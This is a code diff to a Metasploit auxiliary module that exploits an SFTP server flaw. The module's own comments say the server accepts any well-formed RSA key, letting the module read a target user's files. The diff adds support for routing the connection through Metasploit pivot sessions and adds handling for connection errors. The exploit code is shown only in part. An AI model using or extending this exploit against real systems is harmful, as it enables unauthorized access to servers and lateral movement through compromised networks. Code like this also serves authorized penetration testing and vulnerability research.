@@ -54,13 +54,30 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
+  # This method will be used by net/ssh when creating a new TCP socket. We neet this so the net/ssh library will
+  # honor Metasploits network pivots, and route a connection through the expected session if applicable.
+  def open(host, port, _connection_options = nil)
+    vprint_status("Creating Rex::Socket::Tcp to #{host}:#{port}...")
+    Rex::Socket::Tcp.create(
+      'PeerHost' => host,
+      'PeerPort' => port,
+      'Proxies' => datastore['Proxies'],
+      'Context' => {
+        'Msf' => framework,
+        'MsfExploit' => self
+      }
+    )
+  end
+
   def check
     # Our check method will establish an unauthenticated connection to the remote SFTP (which is an extension of SSH)
     # service and we pull out the servers version string.
     transport = ::Net::SSH::Transport::Session.new(
       datastore['RHOST'],
       {
-        port: datastore['RPORT']
+        port: datastore['RPORT'],
+        # Use self as a proxy for the net/ssh library, to allow us to use Metasploit's Rex sockets, which will honor pivots.
+        proxy: self
       }
     )
 
@@ -71,7 +88,11 @@ class MetasploitModule < Msf::Auxiliary
 
     # We cannot get a product version number, so the best we can do is return Detected.
     Msf::Exploit::CheckCode::Detected(ident)
-  rescue Net::SSH::ConnectionTimeout
+  rescue ::Rex::ConnectionRefused
+    Msf::Exploit::CheckCode::Unknown('Connection Refused')
+  rescue ::Rex::HostUnreachable
+    Msf::Exploit::CheckCode::Unknown('Host Unreachable')
+  rescue ::Rex::ConnectionTimeout, ::Net::SSH::ConnectionTimeout
     Msf::Exploit::CheckCode::Unknown('Connection Timeout')
   end
 
@@ -99,7 +120,9 @@ class MetasploitModule < Msf::Auxiliary
         auth_methods: ['publickey'],
         # The vulnerability allows us to supply any well formed RSA key and it will be accepted. So we generate a new
         # key (in PEM format) every time we exploit the vulnerability.
-        key_data: [OpenSSL::PKey::RSA.new(2048).to_pem]
+        key_data: [OpenSSL::PKey::RSA.new(2048).to_pem],
+        # Use self as a proxy for the net/ssh library, to allow us to use Metasploit's Rex sockets, which will honor pivots.
+        proxy: self
       }
     ) do |sftp|
       if File.directory? datastore['TARGETFILE']
@@ -116,6 +139,12 @@ class MetasploitModule < Msf::Auxiliary
     print_error('SFTP Status Exception.')
   rescue ::Net::SSH::AuthenticationFailed
     print_error('SFTP Authentication Failed. Is TARGETUSER a valid username?')
+  rescue ::Rex::ConnectionRefused
+    print_error('SFTP Connection Refused.')
+  rescue ::Rex::HostUnreachable
+    print_error('SFTP Host Unreachable.')
+  rescue ::Rex::ConnectionTimeout, ::Net::SSH::ConnectionTimeout
+    print_error('SFTP Connection Timeout.')
   ensure
     ::Net::SSH::Authentication::Methods::Publickey.send(:alias_method, :build_request, :orig_build_request)
   end
